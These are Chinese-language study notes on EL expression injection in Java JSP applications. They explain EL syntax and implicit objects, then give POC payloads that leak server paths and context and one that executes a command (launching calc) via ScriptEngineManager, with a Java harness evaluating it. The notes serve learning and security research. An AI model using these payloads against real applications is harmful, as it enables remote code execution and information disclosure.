# EL表达式注入

之前见过很多次了但是一直没有学习过，了解一下。内容都摘录自mi1k7ea师傅的文章，因为讲的很好了。

## 简介

EL（Expression Language） 是为了使JSP写起来更加简单。

EL表达式主要功能如下：

- 获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；
- 执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如`${user==null}`；
- 获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；
- 调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；

之后的利用更多是调用Java方法进行代码执行和命令执行，以及可能利用各种对象对一些配置进行修改。

## 基本语法

`${xxxxx}`

| 属性范围在EL中的名称 |                  |
| -------------------- | ---------------- |
| Page                 | PageScope        |
| Request              | RequestScope     |
| Session              | SessionScope     |
| Application          | ApplicationScope |

| 术语         | 定义                                                         |
| ------------ | ------------------------------------------------------------ |
| pageContext  | JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，`${pageContext.response}`为页面的响应对象赋值。 |
| param        | 将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式`${param . name}`相当于 request.getParameter (name)。 |
| paramValues  | 将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 `${paramvalues. name}` 相当于 request.getParamterValues(name)。 |
| header       | 将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 `${header. name}` 相当于 request.getHeader(name)。 |
| headerValues | 将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式`${headerValues. name}`相当于 request.getHeaderValues(name)。 |
| cookie       | 将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式`${cookie. name .value}`返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用`${headerValues. name}`表达式。 |
| initParam    | 将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。 |

| 术语             | 定义                                                         |
| ---------------- | ------------------------------------------------------------ |
| pageScope        | 将页面范围的变量名称映射到其值。例如，EL 表达式可以使用`${pageScope.objectName}`访问一个 JSP 中页面范围的对象，还可以使用`${pageScope .objectName. attributeName}`访问对象的属性。 |
| requestScope     | 将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用`${requestScope. objectName}`访问一个 JSP 请求范围的对象，还可以使用`${requestScope. objectName. attributeName}`访问对象的属性。 |
| sessionScope     | 将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：`${sessionScope. name}` |
| applicationScope | 将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。 |

例子：

```jsp
${pageContext.request.queryString}
${param["username"]} //获取访问参数值,get和post的
${header["user-agent"]}
```



## POC

```jsp
//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
${pageContext}

//获取Web路径
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}

//文件头参数
${header}

//获取webRoot
${applicationScope}

//执行命令
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")}
```



## 例子

```java

import org.apache.el.ExpressionFactoryImpl;
import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.StandardELContext;
import javax.el.ValueExpression;

public class MyTest {
    public static void main(String[] args) throws Exception {
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
        ELContext elContext  = new StandardELContext(expressionFactory);
        String exp = "${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()\")}";
        ValueExpression valueExpression = expressionFactory.createValueExpression(elContext, exp, String.class);
        System.out.println(valueExpression.getValue(elContext));
    }
}
```



## 参考文章

https://xz.aliyun.com/t/7692